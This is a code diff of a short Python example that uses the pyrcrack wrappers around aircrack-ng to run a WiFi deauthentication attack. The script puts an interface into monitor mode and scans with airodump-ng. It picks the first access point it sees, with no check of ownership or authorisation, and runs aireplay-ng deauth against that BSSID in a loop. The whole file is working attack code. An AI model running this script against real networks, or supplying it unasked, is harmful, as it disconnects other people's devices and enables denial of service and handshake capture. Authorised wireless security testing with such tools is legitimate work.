@@ -1,35 +1,50 @@
 """Deauth"""
 from contextlib import suppress
+
+from rich.console import Console
+from rich.prompt import Prompt
+
 import asyncio
 import pyrcrack
 
+CONSOLE = Console()
+CONSOLE.clear()
+CONSOLE.show_cursor(False)
 
-async def attack(interface, apo):
+
+async def attack(apo):
     """Run aireplay deauth attack."""
-    async with pyrcrack.AirmonNg() as airmon:
-        await airmon.set_monitor(interface['interface'], apo.channel)
+    airmon = pyrcrack.AirmonNg()
+    interfaces = await airmon.interfaces
+    CONSOLE.print("Starting airmon-ng with channel {}".format(apo.channel))
+    interface = interfaces[0]
+    async with airmon(interface.interface, apo.channel) as mon:
         async with pyrcrack.AireplayNg() as aireplay:
-            await aireplay.run(interface['interface'], deauth=10, D=True)
+            CONSOLE.print("Starting aireplay on {} for {}".format(
+                mon.monitor_interface, apo.bssid))
+            await aireplay.run(mon.monitor_interface,
+                               deauth=10,
+                               D=True,
+                               b=apo.bssid)
             while True:
+                CONSOLE.print(aireplay.meta)
                 await asyncio.sleep(2)
 
 
 async def deauth():
     """Scan for targets, return json."""
-    async with pyrcrack.AirmonNg() as airmon:
-        interface = (await airmon.list_wifis())[0]['interface']
-        interface = (await airmon.set_monitor(interface))[0]
-
+    airmon = pyrcrack.AirmonNg()
+    interfaces = await airmon.interfaces
+    async with airmon(interfaces[0].interface) as mon:
         async with pyrcrack.AirodumpNg() as pdump:
-            await pdump.run(interface['interface'], write_interval=1)
-            # Extract first results
-            while True:
+            async for result in pdump(mon.monitor_interface):
+                CONSOLE.print(result.table)
                 with suppress(KeyError):
-                    await asyncio.sleep(2)
-                    ap = pdump.sorted_aps()[0]
+                    ap = result[0]
+                    CONSOLE.print('Selected AP {}'.format(ap.bssid))
                     break
-            # Deauth.
-            await attack(interface, ap)
+                await asyncio.sleep(3)
+    await attack(ap)
 
 
 asyncio.run(deauth())
